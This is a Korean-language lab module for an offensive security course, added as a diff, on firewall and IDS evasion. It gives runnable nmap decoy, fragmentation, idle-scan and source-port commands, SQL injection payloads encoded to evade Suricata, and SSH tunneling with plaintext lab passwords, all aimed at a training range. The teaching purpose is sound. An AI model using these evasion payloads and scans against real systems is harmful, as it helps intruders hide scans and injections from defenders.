@@ -1,0 +1,1099 @@
+# Week 03: 네트워크 우회 기법 — 방화벽 우회, IDS 회피, 프래그먼트 공격
+
+## 학습 목표
+- 네트워크 보안 장비(방화벽, IDS/IPS, WAF)의 탐지 원리를 심층적으로 이해한다
+- nmap의 방화벽 우회 기법(Decoy, Fragmentation, Idle Scan 등)을 실행하고 효과를 검증할 수 있다
+- IP 프래그먼테이션을 활용한 IDS 회피 공격 원리를 이해하고 구현할 수 있다
+- Suricata/Snort IDS 규칙의 탐지 로직을 분석하고 우회 방법을 설계할 수 있다
+- nftables 방화벽 규칙을 분석하고 우회 가능한 약점을 식별할 수 있다
+- 터널링(SSH, DNS, ICMP)을 이용한 방화벽 우회 기법을 실행할 수 있다
+- MITRE ATT&CK Defense Evasion 전술의 네트워크 관련 기법을 매핑할 수 있다
+
+## 전제 조건
+- TCP/IP 프로토콜 스택(3계층, 4계층)의 동작 원리를 이해하고 있어야 한다
+- nmap의 기본 스캔 기법(SYN, Connect, UDP)을 수행할 수 있어야 한다
+- 방화벽(nftables/iptables) 규칙의 기본 구조를 읽을 수 있어야 한다
+- Wireshark/tcpdump로 패킷을 캡처하고 분석할 수 있어야 한다
+
+## 실습 환경 (6v6 4-tier)
+
+학생 PC 의 `~/.ssh/config` 의 ProxyJump 설정 후 `ssh 6v6-<name>` 으로 접속.
+
+| 컨테이너 | 6v6 IP | 역할 | 접속 |
+|---------|--------|------|------|
+| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh 6v6-bastion` (pw: ccc) |
+| fw (secu) | 10.20.30.1 | 방화벽/HAProxy/Suricata ext | `ssh 6v6-fw` |
+| web | 10.20.32.80 | Apache + ModSecurity + JuiceShop (대상) | `ssh 6v6-web` |
+| siem | 10.20.32.100 | Wazuh manager + alerts.json | `ssh 6v6-siem` |
+| attacker | 10.20.30.202 | 공격 출발점 (pen-test 도구) | `ssh 6v6-attacker` |
+
+## 강의 시간 배분 (3시간)
+
+| 시간 | 내용 | 유형 |
+|------|------|------|
+| 0:00-0:35 | 보안 장비 탐지 원리 + 우회 이론 | 강의 |
+| 0:35-1:10 | nmap 방화벽 우회 기법 실습 | 실습 |
+| 1:10-1:20 | 휴식 | - |
+| 1:20-1:55 | IP 프래그먼트 + IDS 회피 실습 | 실습 |
+| 1:55-2:30 | 터널링 기법 실습 | 실습 |
+| 2:30-2:40 | 휴식 | - |
+| 2:40-3:10 | 종합 우회 시나리오 실습 | 실습 |
+| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |
+
+---
+
+# Part 1: 보안 장비 탐지 원리와 우회 이론 (35분)
+
+## 1.1 네트워크 보안 장비 계층 구조
+
+```mermaid
+graph BT
+    L2["L2 스위치 보안<br/>802.1X, MAC 필터링"] --> L3["L3-L4 방화벽<br/>nftables, iptables<br/>IP/포트 필터링"]
+    L3 --> L4["L4-L7 IDS/IPS<br/>Suricata, Snort<br/>페이로드 분석"]
+    L4 --> L7["L7 WAF<br/>ModSecurity, BunkerWeb<br/>HTTP 분석"]
+    style L2 fill:#21262d,color:#e6edf3
+    style L3 fill:#58a6ff,color:#fff
+    style L4 fill:#d29922,color:#fff
+    style L7 fill:#f85149,color:#fff
+```
+
+### 각 보안 장비의 탐지 방식
+
+| 장비 | 탐지 방식 | 강점 | 약점 |
+|------|----------|------|------|
+| **nftables** (L3-L4) | 규칙 매칭 (IP, 포트, 프로토콜) | 빠름, 정확함 | 페이로드 무시 |
+| **Suricata** (L4-L7) | 시그니처 + 프로토콜 파싱 | 심층 분석 | 암호화 트래픽 무력 |
+| **BunkerWeb** (L7) | HTTP 규칙, 봇 탐지, 속도 제한 | 웹 특화 | 비-HTTP 무력 |
+
+## 1.2 방화벽(nftables) 탐지 로직
+
+nftables는 **패킷의 헤더 정보**를 기반으로 허용/차단을 결정한다.
+
+```
+패킷 → [소스IP] [목적지IP] [프로토콜] [소스포트] [목적지포트] [플래그]
+           ↓         ↓          ↓          ↓           ↓          ↓
+        규칙 매칭: ip saddr / ip daddr / tcp dport / ct state 등
+           ↓
+     accept / drop / reject
+```
+
+### nftables 규칙 구조
+
+```
+table inet filter {
+    chain input {
+        type filter hook input priority 0;
+        ct state established,related accept    # 기존 연결 허용
+        ct state invalid drop                   # 비정상 패킷 드롭
+        iif lo accept                           # 루프백 허용
+        tcp dport 22 accept                     # SSH 허용
+        tcp dport 80 accept                     # HTTP 허용
+        tcp dport 443 accept                    # HTTPS 허용
+        counter drop                            # 나머지 차단
+    }
+}
+```
+
+### 방화벽 우회 가능한 약점
+
+| 약점 | 우회 방법 | ATT&CK |
+|------|----------|--------|
+| 허용된 포트(80, 443) | 해당 포트로 C2 통신 | T1571 |
+| 아웃바운드 미필터링 | 리버스 셸 | T1095 |
+| DNS(53) 허용 | DNS 터널링 | T1071.004 |
+| ICMP 허용 | ICMP 터널링 | T1095 |
+| IPv6 미필터링 | IPv6 공격 | T1205 |
+| 프래그먼트 처리 | 프래그먼트 공격 | T1027.013 |
+
+## 1.3 IDS/IPS(Suricata) 탐지 로직
+
+Suricata는 **시그니처(규칙) 기반 + 프로토콜 분석**으로 악성 트래픽을 탐지한다.
+
+### Suricata 규칙 구조
+
+```
+action  protocol  src_ip  src_port  ->  dst_ip  dst_port  (options)
+
+예시:
+alert tcp $HOME_NET any -> $EXTERNAL_NET any (
+    msg:"ET SCAN Nmap SYN Scan";
+    flags:S;
+    flow:stateless;
+    threshold: type both, track by_src, count 30, seconds 60;
+    sid:2000001; rev:1;
+)
+```
+
+### IDS 회피 기법 분류
+
+| 기법 | 원리 | 효과 |
+|------|------|------|
+| 프래그먼테이션 | 페이로드를 여러 패킷에 분산 | 시그니처 매칭 실패 |
+| 인코딩 | URL 인코딩, Base64, 이중 인코딩 | 페이로드 변형 |
+| 암호화 | TLS/SSL 사용 | 페이로드 불가시 |
+| 프로토콜 위반 | 비표준 패킷 구성 | 파싱 오류 유발 |
+| 타이밍 | 저속 공격, 분산 | 임계값 미만 유지 |
+| 다형성 | 페이로드 매번 변경 | 정적 시그니처 우회 |
+
+## 1.4 MITRE ATT&CK: Defense Evasion (네트워크)
+
+| 기법 ID | 기법 이름 | 설명 | 이번 주 실습 |
+|---------|---------|------|:---:|
+| T1205 | Traffic Signaling | 포트 노킹, WoL | △ |
+| T1205.001 | Port Knocking | 특정 순서 포트 접속 | △ |
+| T1572 | Protocol Tunneling | SSH, DNS 터널링 | ✓ |
+| T1571 | Non-Standard Port | 비표준 포트 사용 | ✓ |
+| T1001 | Data Obfuscation | 트래픽 난독화 | ✓ |
+| T1001.001 | Junk Data | 더미 데이터 삽입 | ✓ |
+| T1001.003 | Protocol Impersonation | 프로토콜 위장 | ✓ |
+| T1090 | Proxy | 프록시 경유 | △ |
+| T1027.013 | Encrypted/Encoded File | 프래그먼트/인코딩 | ✓ |
+
+---
+
+# Part 2: nmap 방화벽 우회 기법 실습 (35분)
+
+## 2.1 Decoy 스캔
+
+Decoy 스캔은 **여러 가짜 IP에서 동시에 스캔하는 것처럼 위장**하여 실제 공격자 IP를 숨기는 기법이다.
+
+```
+실제 공격자: 10.20.30.201
+
+Decoy 패킷 (방어자가 보는 것):
+  10.20.30.201 → 10.20.30.80 (실제)
+  192.168.1.100 → 10.20.30.80 (가짜)
+  172.16.0.50 → 10.20.30.80 (가짜)
+  10.0.0.1 → 10.20.30.80 (가짜)
+
+방어자: "어느 것이 진짜인지 구분 불가"
+```
+
+## 실습 2.1: Decoy 스캔
+
+> **실습 목적**: Decoy 스캔으로 스캔 출발지를 위장하여 방어자의 IP 추적을 방해하는 기법을 실습한다
+>
+> **배우는 것**: nmap -D 옵션을 사용한 Decoy 스캔의 원리와 방어자 관점에서의 탐지를 배운다
+>
+> **결과 해석**: Suricata 로그에 여러 소스 IP의 스캔 알림이 나타나면 Decoy가 성공한 것이다
+>
+> **실전 활용**: 실제 APT는 봇넷이나 VPN을 이용하여 유사한 효과를 달성한다
+>
+> **명령어 해설**: -D RND:5는 5개의 랜덤 IP를 Decoy로 사용하며, ME는 자신의 실제 IP를 포함한다
+>
+> **트러블슈팅**: Decoy IP가 비현실적이면(인터넷 상 존재하지 않는 IP) 방화벽에서 드롭될 수 있다
+
+```bash
+# 일반 스캔 (비교 기준)
+echo "=== 일반 SYN 스캔 ==="
+echo 1 | sudo -S nmap -sS -p 22,80 10.20.30.80 2>/dev/null | grep "open\|PORT"
+
+echo ""
+echo "=== Decoy 스캔 (5개 가짜 IP 사용) ==="
+# -D RND:5 = 5개 랜덤 Decoy IP 생성
+echo 1 | sudo -S nmap -sS -D RND:5 -p 22,80 10.20.30.80 2>/dev/null | grep "open\|PORT"
+
+echo ""
+echo "=== Decoy 스캔 (특정 IP 지정) ==="
+# 실제 내부 네트워크 IP를 Decoy로 사용 (더 현실적)
+echo 1 | sudo -S nmap -sS -D 10.20.30.1,10.20.30.100,10.20.30.50,ME -p 22,80 10.20.30.80 2>/dev/null | grep "open\|PORT"
+
+echo ""
+echo "=== IDS 로그 확인 (Decoy 효과 검증) ==="
+sleep 2
+ssh 6v6-fw \
+  "tail -10 /var/log/suricata/fast.log 2>/dev/null | grep -i 'scan' || echo 'No scan alerts'"
+```
+
+## 2.2 프래그먼테이션 스캔
+
+IP 프래그먼테이션은 패킷을 **작은 조각으로 분할**하여 전송하는 것이다. IDS는 조각을 재조립해야 시그니처를 매칭할 수 있다.
+
+```
+정상 패킷:
+[IP Header][TCP Header][Payload: GET /admin HTTP/1.1]
+
+프래그먼트된 패킷:
+[IP Header][Fragment 1: TCP Hea]
+[IP Header][Fragment 2: der][Pa]
+[IP Header][Fragment 3: yload: ]
+[IP Header][Fragment 4: GET /ad]
+[IP Header][Fragment 5: min HTT]
+[IP Header][Fragment 6: P/1.1]
+
+IDS가 재조립에 실패하면 → 시그니처 매칭 불가 → 탐지 회피
+```
+
+## 실습 2.2: 프래그먼테이션 스캔
+
+> **실습 목적**: IP 프래그먼테이션을 이용한 IDS 회피 스캔을 실습한다
+>
+> **배우는 것**: nmap -f 옵션의 프래그먼트 크기와 IDS 탐지 우회 효과를 이해한다
+>
+> **결과 해석**: 프래그먼트 스캔이 일반 스캔과 동일한 결과를 반환하면서 IDS 알림이 줄면 성공이다
+>
+> **실전 활용**: 현대 IDS(Suricata)는 재조립 기능이 있어 단순 프래그먼트만으로는 회피 어렵다
+>
+> **명령어 해설**: -f는 8바이트 프래그먼트, -ff는 16바이트, --mtu로 크기 지정 가능하다
+>
+> **트러블슈팅**: 프래그먼트 패킷이 드롭되면 방화벽이 프래그먼트를 차단하는 것이다
+
+```bash
+# 일반 스캔 (비교 기준)
+echo "=== 일반 SYN 스캔 ==="
+echo 1 | sudo -S nmap -sS -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open\|PORT"
+
+echo ""
+echo "=== 프래그먼트 스캔 (-f: 8바이트 조각) ==="
+echo 1 | sudo -S nmap -sS -f -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open\|PORT"
+
+echo ""
+echo "=== 더 작은 프래그먼트 (-ff: 16바이트 → 실제론 더 세분화) ==="
+echo 1 | sudo -S nmap -sS -ff -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open\|PORT"
+
+echo ""
+echo "=== 커스텀 MTU (24바이트) ==="
+echo 1 | sudo -S nmap -sS --mtu 24 -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open\|PORT"
+
+echo ""
+echo "=== tcpdump으로 프래그먼트 확인 ==="
+# 프래그먼트된 패킷 관찰 (3초 캡처)
+echo 1 | sudo -S timeout 5 tcpdump -i any -c 20 'host 10.20.30.80 and (ip[6:2] & 0x1fff != 0)' 2>/dev/null || echo "프래그먼트 패킷 미캡처 (정상일 수 있음)"
+```
+
+## 실습 2.3: Idle/Zombie 스캔 원리
+
+> **실습 목적**: 자신의 IP를 전혀 노출하지 않는 Idle(Zombie) 스캔의 원리를 이해한다
+>
+> **배우는 것**: IP ID 증분을 이용한 간접 스캔의 이론과 실행 조건을 배운다
+>
+> **결과 해석**: Zombie 호스트의 IP ID가 증가하면 대상 포트가 열려있는 것이다
+>
+> **실전 활용**: 완전히 은닉된 포트 스캔이 필요한 극도로 은밀한 정찰에 사용한다
+>
+> **명령어 해설**: -sI는 Idle 스캔이며, Zombie 호스트의 IP를 지정한다
+>
+> **트러블슈팅**: Zombie 호스트가 적합하지 않으면 "Idle scan zombie is not idle" 에러가 발생한다
+
+```bash
+# Idle Scan 원리 설명
+cat << 'IDLE_SCAN'
+=== Idle (Zombie) Scan 원리 ===
+
+전제: Zombie 호스트는 IP ID를 순차적으로 증가시켜야 한다
+
+1단계: Zombie의 현재 IP ID 확인
+   공격자 → Zombie: SYN/ACK
+   Zombie → 공격자: RST (IP ID = 1000)
+
+2단계: 위조 패킷 전송
+   공격자 → 대상: SYN (소스IP = Zombie IP)
+
+3단계: 대상 응답에 따른 분기
+   [포트 열림]
+   대상 → Zombie: SYN/ACK → Zombie → 대상: RST (IP ID 증가!)
+   [포트 닫힘]
+   대상 → Zombie: RST → Zombie: 아무것도 안 함 (IP ID 미증가)
+
+4단계: Zombie IP ID 재확인
+   공격자 → Zombie: SYN/ACK
+   Zombie → 공격자: RST (IP ID = 1001 또는 1002)
+
+   IP ID 1001 → 포트 닫힘 (1회 증가: 우리 확인 패킷만)
+   IP ID 1002 → 포트 열림 (2회 증가: 대상 응답 + 확인)
+IDLE_SCAN
+
+echo ""
+echo "=== Idle Scan 실행 (Zombie 적합성 확인) ==="
+# 내부 네트워크에서 Zombie 후보 확인
+echo 1 | sudo -S nmap -O -v 10.20.30.100 2>/dev/null | grep -i "IP ID\|ipid\|incremental" || echo "IP ID 패턴 확인 불가"
+
+# Idle Scan 시도 (Zombie: siem 서버)
+echo 1 | sudo -S nmap -sI 10.20.30.100 -p 22,80 10.20.30.80 2>/dev/null || echo "Idle Scan 실행 불가 (Zombie가 적합하지 않을 수 있음)"
+```
+
+## 실습 2.4: 소스 포트 조작
+
+> **실습 목적**: 방화벽이 신뢰하는 소스 포트(53, 80, 443)를 사용하여 스캔을 우회한다
+>
+> **배우는 것**: 방화벽 규칙의 소스 포트 기반 필터링 약점과 우회 방법을 배운다
+>
+> **결과 해석**: 일반 스캔에서 filtered인 포트가 소스 포트 조작으로 open이 되면 우회 성공이다
+>
+> **실전 활용**: 오래된 방화벽 규칙에서 DNS(53), HTTP(80) 소스 포트를 허용하는 경우가 있다
+>
+> **명령어 해설**: --source-port 또는 -g 옵션으로 소스 포트를 지정한다
+>
+> **트러블슈팅**: 소스 포트 사용에 권한이 필요하면 sudo로 실행한다
+
+```bash
+# 소스 포트 53 (DNS) 사용
+echo "=== 소스 포트 53 (DNS) 스캔 ==="
+echo 1 | sudo -S nmap -sS --source-port 53 -p 22,80,443 10.20.30.80 2>/dev/null | grep "open\|filtered\|PORT"
+
+echo ""
+echo "=== 소스 포트 80 (HTTP) 스캔 ==="
+echo 1 | sudo -S nmap -sS -g 80 -p 22,80,443 10.20.30.80 2>/dev/null | grep "open\|filtered\|PORT"
+
+echo ""
+echo "=== 소스 포트 443 (HTTPS) 스캔 ==="
+echo 1 | sudo -S nmap -sS -g 443 -p 22,3000,8002 10.20.30.80 2>/dev/null | grep "open\|filtered\|PORT"
+
+echo ""
+echo "[설명] 방화벽이 소스포트 53/80/443을 신뢰하면 필터링된 포트에도 접근 가능"
+```
+
+---
+
+# Part 3: IDS 회피 + 프래그먼트 고급 (35분)
+
+## 3.1 Suricata 규칙 분석과 우회
+
+Suricata 규칙의 구조를 이해하면 어떤 패턴이 탐지되는지 알 수 있고, 우회 방법을 설계할 수 있다.
+
+### 규칙 분석 예시
+
+```
+# 규칙 1: Nmap SYN 스캔 탐지
+alert tcp any any -> $HOME_NET any (
+    msg:"ET SCAN Potential Nmap SYN Scan";
+    flags:S,12;                           # SYN 플래그만 설정
+    flow:stateless;
+    threshold: type both, track by_src, count 50, seconds 5;
+    sid:2000001;
+)
+
+우회 방법:
+1. 임계값(50/5초) 미만으로 저속 스캔
+2. SYN 외 다른 플래그 조합 사용 (FIN, ACK)
+3. 여러 소스 IP에서 분산 스캔
+```
+
+```
+# 규칙 2: SQL Injection 탐지
+alert http any any -> $HOME_NET any (
+    msg:"ET WEB_SERVER SQL Injection";
+    content:"UNION"; nocase;
+    content:"SELECT"; nocase;
+    sid:2000002;
+)
+
+우회 방법:
+1. 대소문자 혼합: UnIoN SeLeCt
+2. 인코딩: %55NION %53ELECT
+3. 주석 삽입: UN/**/ION SE/**/LECT
+4. 동의어: UNION ALL SELECT
+```
+
+## 실습 3.1: Suricata 규칙 확인 및 우회 테스트
+
+> **실습 목적**: 실습 환경의 Suricata 규칙을 확인하고, 규칙을 우회하는 기법을 테스트한다
+>
+> **배우는 것**: Suricata 규칙 구조 분석, content 매칭 우회, 임계값 우회를 배운다
+>
+> **결과 해석**: 우회 기법 적용 후 fast.log에 알림이 발생하지 않으면 우회 성공이다
+>
+> **실전 활용**: Red Team은 타겟 IDS 규칙을 분석하여 탐지되지 않는 페이로드를 설계한다
+>
+> **명령어 해설**: suricata 규칙 파일에서 특정 패턴을 검색하여 탐지 로직을 파악한다
+>
+> **트러블슈팅**: 규칙 파일 위치는 /etc/suricata/rules/ 또는 /var/lib/suricata/rules/이다
+
+```bash
+# Suricata 규칙 확인
+echo "=== Suricata 활성 규칙 확인 ==="
+ssh 6v6-fw \
+  "ls /etc/suricata/rules/ 2>/dev/null || ls /var/lib/suricata/rules/ 2>/dev/null | head -10" 2>/dev/null || echo "규칙 디렉토리 접근 불가"
+
+echo ""
+echo "=== 스캔 탐지 규칙 검색 ==="
+ssh 6v6-fw \
+  "grep -r 'SCAN\|scan' /etc/suricata/rules/ 2>/dev/null | head -5 || echo 'rules 디렉토리 확인 불가'"
+
+echo ""
+echo "=== SQL Injection 탐지 규칙 검색 ==="
+ssh 6v6-fw \
+  "grep -r 'SQL\|sql.*inject\|UNION.*SELECT' /etc/suricata/rules/ 2>/dev/null | head -5 || echo '규칙 확인 불가'"
+
+echo ""
+echo "=== 현재 Suricata 알림 (최근 10건) ==="
+ssh 6v6-fw \
+  "tail -10 /var/log/suricata/fast.log 2>/dev/null || echo 'fast.log 없음'"
+```
+
+## 실습 3.2: 인코딩 기반 IDS 우회
+
+> **실습 목적**: URL 인코딩, 이중 인코딩, 대소문자 혼합 등으로 IDS 시그니처를 우회한다
+>
+> **배우는 것**: HTTP 요청의 다양한 인코딩 방식과 IDS/WAF의 디코딩 처리 차이를 배운다
+>
+> **결과 해석**: 인코딩된 요청이 원본과 동일한 응답을 받으면서 IDS 알림이 없으면 우회 성공이다
+>
+> **실전 활용**: WAF 우회, IDS 회피에서 인코딩 기법은 가장 기본적인 우회 수단이다
+>
+> **명령어 해설**: %xx 형식은 URL 인코딩이며, IDS가 디코딩하지 않으면 패턴 매칭에 실패한다
+>
+> **트러블슈팅**: 이중 인코딩이 동작하지 않으면 서버/WAF가 자동 디코딩하는 것이다
+
+```bash
+# SQL Injection IDS 우회 테스트
+echo "=== 1. 원본 SQLi (탐지 예상) ==="
+curl -s "http://10.20.30.80:3000/rest/products/search?q=' UNION SELECT 1--" 2>/dev/null | head -3
+
+echo ""
+echo "=== 2. URL 인코딩 우회 ==="
+# ' = %27, UNION = %55NION
+curl -s "http://10.20.30.80:3000/rest/products/search?q=%27%20%55NION%20%53ELECT%201--" 2>/dev/null | head -3
+
+echo ""
+echo "=== 3. 이중 인코딩 우회 ==="
+# ' = %2527 (% = %25, 27 유지)
+curl -s "http://10.20.30.80:3000/rest/products/search?q=%2527%20UNION%20SELECT%201--" 2>/dev/null | head -3
+
+echo ""
+echo "=== 4. 대소문자 혼합 우회 ==="
+curl -s "http://10.20.30.80:3000/rest/products/search?q=' UnIoN SeLeCt 1--" 2>/dev/null | head -3
+
+echo ""
+echo "=== 5. 주석 삽입 우회 ==="
+curl -s "http://10.20.30.80:3000/rest/products/search?q=' UN/**/ION SE/**/LECT 1--" 2>/dev/null | head -3
+
+echo ""
+echo "=== IDS 알림 확인 ==="
+sleep 2
+ssh 6v6-fw \
+  "tail -5 /var/log/suricata/fast.log 2>/dev/null | grep -i 'sql\|injection' || echo 'SQL 관련 알림 없음'"
+```
+
+## 실습 3.3: 타이밍 기반 IDS 회피
+
+> **실습 목적**: IDS의 시간 기반 임계값을 회피하는 저속 공격(Low and Slow) 기법을 실습한다
+>
+> **배우는 것**: IDS 임계값(threshold) 설정의 원리와 이를 우회하는 타이밍 조절 기법을 배운다
+>
+> **결과 해석**: 저속 스캔이 IDS 알림 없이 완료되면 임계값 우회 성공이다
+>
+> **실전 활용**: APT는 수일~수주에 걸쳐 정찰하여 모든 시간 기반 탐지를 회피한다
+>
+> **명령어 해설**: --scan-delay는 패킷 간 지연 시간, -T0~T5는 타이밍 프로필이다
+>
+> **트러블슈팅**: 시간이 너무 오래 걸리면 --max-retries 0으로 재시도를 줄인다
+
+```bash
+# 타이밍별 스캔 비교
+echo "=== T4 (공격적) 스캔 ==="
+START=$(date +%s)
+echo 1 | sudo -S nmap -sS -T4 -p 22,80 10.20.30.80 2>/dev/null | grep "open"
+END=$(date +%s)
+echo "소요시간: $((END-START))초"
+
+sleep 2
+
+echo ""
+echo "=== 저속 스캔 (--scan-delay 10s) ==="
+START=$(date +%s)
+echo 1 | sudo -S nmap -sS --scan-delay 10s --max-retries 0 -p 22,80 10.20.30.80 2>/dev/null | grep "open"
+END=$(date +%s)
+echo "소요시간: $((END-START))초"
+
+echo ""
+echo "=== IDS 알림 비교 ==="
+ssh 6v6-fw \
+  "tail -10 /var/log/suricata/fast.log 2>/dev/null | grep -c 'SCAN' || echo '0'" 2>/dev/null
+echo "건의 스캔 알림 발생"
+```
+
+---
+
+# Part 4: 터널링 기법과 종합 우회 시나리오 (35분)
+
+## 4.1 SSH 터널링
+
+SSH 터널링은 **SSH 암호화 채널을 통해 다른 트래픽을 전달**하는 기법이다. 방화벽이 SSH(22)를 허용하면 사실상 모든 트래픽을 통과시킬 수 있다.
+
+### SSH 터널링 유형
+
+| 유형 | 명령 | 용도 |
+|------|------|------|
+| **로컬 포워딩** (-L) | `ssh -L 8080:target:80 jump` | 로컬→원격 서비스 접근 |
+| **리모트 포워딩** (-R) | `ssh -R 9090:localhost:80 attacker` | 원격→로컬 서비스 노출 |
+| **동적 포워딩** (-D) | `ssh -D 1080 jump` | SOCKS 프록시 |
+
+```
+[로컬 포워딩]
+공격자:8080 ----SSH 암호화----> 점프서버 ---평문---> 대상:80
+              방화벽 통과!
+
+[동적 포워딩 (SOCKS)]
+공격자:1080(SOCKS) ---SSH--- 점프서버 ----> 내부서버A:3306
+                                     ----> 내부서버B:5432
+                                     ----> 어디든 접근 가능
+```
+
+## 실습 4.1: SSH 로컬 포트 포워딩
+
+> **실습 목적**: SSH 터널을 통해 방화벽 뒤의 서비스에 접근하는 기법을 실습한다
+>
+> **배우는 것**: SSH -L 옵션으로 로컬 포트를 원격 서비스에 매핑하는 방법을 배운다
+>
+> **결과 해석**: 로컬 포트로 접근했을 때 원격 서비스의 응답이 오면 터널링 성공이다
+>
+> **실전 활용**: 침투 후 내부 네트워크의 서비스에 접근할 때 SSH 피봇팅에 활용한다
+>
+> **명령어 해설**: -L 8888:10.20.30.80:3000은 로컬 8888포트를 원격 3000에 연결한다
+>
+> **트러블슈팅**: 포트 충돌 시 다른 로컬 포트를 사용하고, -N으로 셸 미실행 옵션을 추가한다
+
+```bash
+# SSH 로컬 포트 포워딩
+echo "=== SSH 터널 설정 ==="
+# web 서버의 Juice Shop(3000)을 로컬 8888로 포워딩
+sshpass -p1 ssh -f -N -L 8888:10.20.30.80:3000 ccc@10.20.30.80 2>/dev/null
+sleep 2
+
+# 터널을 통해 접근
+echo "=== 터널 통해 Juice Shop 접근 ==="
+curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" http://localhost:8888/ 2>/dev/null
+
+# 터널 정리
+kill $(pgrep -f "ssh.*8888:10.20.30.80:3000" 2>/dev/null) 2>/dev/null
+echo "[SSH 터널 정리 완료]"
+```
+
+## 실습 4.2: SSH 동적 포워딩 (SOCKS 프록시)
+
+> **실습 목적**: SOCKS 프록시를 통해 점프 서버 뒤의 모든 서비스에 접근하는 기법을 실습한다
+>
+> **배우는 것**: SSH -D 옵션으로 SOCKS 프록시를 구성하고, proxychains으로 도구를 연결하는 방법을 배운다
+>
+> **결과 해석**: proxychains을 통한 nmap/curl이 정상 동작하면 SOCKS 터널이 성공한 것이다
+>
+> **실전 활용**: 측면 이동 시 피봇 호스트를 통해 전체 내부 네트워크를 스캔하는 데 활용한다
+>
+> **명령어 해설**: -D 1080은 로컬에 SOCKS5 프록시를 생성하며, proxychains이 이를 사용한다
+>
+> **트러블슈팅**: proxychains 미설치 시 apt install proxychains4, 설정은 /etc/proxychains4.conf
+
+```bash
+# SSH 동적 포워딩 (SOCKS 프록시)
+echo "=== SOCKS 프록시 설정 ==="
+sshpass -p1 ssh -f -N -D 1080 ccc@10.20.30.80 2>/dev/null
+sleep 2
+
+# proxychains 설정 확인
+if which proxychains4 >/dev/null 2>&1 || which proxychains >/dev/null 2>&1; then
+  echo "proxychains 설치됨"
+  echo "=== SOCKS 프록시 통한 접근 ==="
+  # proxychains4 curl http://10.20.30.100:8002/ 2>/dev/null || echo "proxychains 실행 실패"
+  echo "[교육] proxychains4 curl http://내부서버/ 형태로 사용"
+else
+  echo "proxychains 미설치 - apt install proxychains4"
+fi
+
+# curl로 직접 SOCKS 프록시 사용
+echo ""
+echo "=== curl --socks5 사용 ==="
+curl -s --socks5 localhost:1080 -o /dev/null -w "HTTP Status: %{http_code}\n" http://10.20.30.80:3000/ 2>/dev/null || echo "SOCKS 프록시 연결 실패"
+
+# 정리
+kill $(pgrep -f "ssh.*-D 1080" 2>/dev/null) 2>/dev/null
+echo "[SOCKS 프록시 정리 완료]"
+```
+
+## 4.2 DNS 터널링 개요
+
+DNS 터널링은 DNS 프로토콜 내부에 데이터를 인코딩하여 전달하는 기법이다. DNS(53)는 거의 모든 네트워크에서 허용되므로 강력한 우회 수단이다.
+
+```
+[DNS 터널링 구조]
+클라이언트 → DNS 재귀 서버 → 공격자 DNS 서버
+  (데이터를 서브도메인에 인코딩)
+  쿼리: aGVsbG8gd29ybGQ.tunnel.attacker.com
+  응답: TXT "cmVzcG9uc2U=" (base64 인코딩 데이터)
+```
+
+### DNS 터널링 도구
+
+| 도구 | 특징 | 속도 |
+|------|------|------|
+| iodine | 가장 안정적, IP over DNS | 중간 |
+| dnscat2 | 암호화 지원, 다기능 | 느림 |
+| dns2tcp | 단순, TCP over DNS | 빠름 |
+| DNSExfiltrator | 데이터 유출 특화 | 느림 |
+
+## 실습 4.3: 종합 우회 시나리오
+
+> **실습 목적**: 학습한 모든 우회 기법을 결합하여 다층 보안을 우회하는 종합 시나리오를 실행한다
+>
+> **배우는 것**: 실제 APT가 여러 기법을 조합하는 방식과, 방어 측의 탐지 포인트를 종합적으로 배운다
+>
+> **결과 해석**: 각 우회 기법의 성공/실패를 기록하고 방어 로그와 대조하여 분석한다
+>
+> **실전 활용**: 모의해킹에서 보안 장비를 우회하여 목표에 도달하는 전체 플로우에 활용한다
+>
+> **명령어 해설**: 복수의 nmap 옵션과 curl 인코딩을 조합한 종합 공격 명령이다
+>
+> **트러블슈팅**: 특정 기법이 실패하면 해당 기법만 분리하여 원인을 분석한다
+
+```bash
+echo "============================================================"
+echo "         종합 우회 시나리오 — 다층 보안 통과                   "
+echo "============================================================"
+
+echo ""
+echo "[단계 1] 저속 + 프래그먼트 + Decoy 결합 스캔"
+echo 1 | sudo -S nmap -sS -f -D RND:3 --scan-delay 3s -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open\|PORT"
+
+echo ""
+echo "[단계 2] 소스 포트 53(DNS) 사용 + 서비스 감지"
+echo 1 | sudo -S nmap -sV --source-port 53 -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open\|PORT"
+
+echo ""
+echo "[단계 3] 인코딩된 웹 공격 (WAF/IDS 우회)"
+# URL 인코딩 + 대소문자 혼합
+curl -s -o /dev/null -w "HTTP %{http_code}" \
+  "http://10.20.30.80:3000/rest/products/search?q=%27%20UnIoN%20SeLeCt%201--" 2>/dev/null
+echo ""
+
+echo ""
+echo "[단계 4] SSH 터널 통한 내부 접근"
+sshpass -p1 ssh -f -N -L 9999:localhost:8002 ccc@10.20.30.80 2>/dev/null
+sleep 1
+curl -s -o /dev/null -w "SubAgent via tunnel: HTTP %{http_code}\n" http://localhost:9999/ 2>/dev/null
+kill $(pgrep -f "ssh.*9999:localhost:8002" 2>/dev/null) 2>/dev/null
+
+echo ""
+echo "[단계 5] 방어 로그 확인"
+sleep 2
+ssh 6v6-fw \
+  "echo 'Suricata 알림:' && tail -5 /var/log/suricata/fast.log 2>/dev/null || echo 'N/A'" 2>/dev/null
+
+ssh 6v6-siem \
+  "echo 'Wazuh 알림:' && tail -3 /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c '
+import sys,json
+for line in sys.stdin:
+    try:
+        d=json.loads(line)
+        print(f\"  [{d.get(\"rule\",{}).get(\"level\",\"?\")}] {d.get(\"rule\",{}).get(\"description\",\"?\")}\")
+    except: pass' 2>/dev/null || echo '  N/A'" 2>/dev/null
+
+echo ""
+echo "============================================================"
+echo "  결과 분석: 어떤 기법이 탐지되었고 어떤 기법이 우회되었는지   "
+echo "  방어 로그와 대조하여 분석하라                                "
+echo "============================================================"
+```
+
+---
+
+## 검증 체크리스트
+
+| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
+|------|---------|----------|----------|
+| 1 | Decoy 스캔 실행 | nmap -D | 정상 결과 + 다수 소스IP |
